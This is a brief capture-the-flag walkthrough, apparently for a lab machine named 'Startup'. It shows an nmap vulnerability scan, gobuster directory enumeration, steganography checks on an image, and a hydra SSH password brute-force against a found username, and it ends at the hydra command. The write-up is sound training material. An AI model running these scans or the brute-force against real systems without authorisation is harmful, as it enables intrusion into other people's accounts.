# Startup

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster, hydra

--------------------------------------------------------------------

## GIVEN INFO


**IP Address**: 10.10.228.144

--------------------------------------------------------------------

## PROCEDURE

### 1. RECON

-script SCRIPT: run specified scripts<br>
-sV: probe open ports to determine service/version info
```
nmap --script vuln -sV 10.10.228.144
```

![1.1](./imgs/1.1.png)

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 3.0.3)<br>
    22 (ssh OpenSSH 7.2p2),<br>
    80 (http Apache httpd 2.4.18)

Anonymous login allowed to ftp server

Enumerate hidden directories on webserver
```
gobuster dir -u http://10.10.228.144 -w /usr/share/dirb/wordlists/common.txt
```

![1.2](./imgs/1.2.png)

Directory of Interest: /files

![1.3](./imgs/1.3.png)

10.10.228.144/files is hosting ftp

potential username found in notice.txt: maya

image found that could have hidden data<br>

See if there is anything hidden in important.jpg
```
binwalk important.jpg
steghide extract -sf important.jpg
```

nothing interesting found

### 2. BRUTE FORCE SSH

```
hydra -l maya -P /usr/share/wordlists/rockyou.txt ssh://10.10.228.144
```

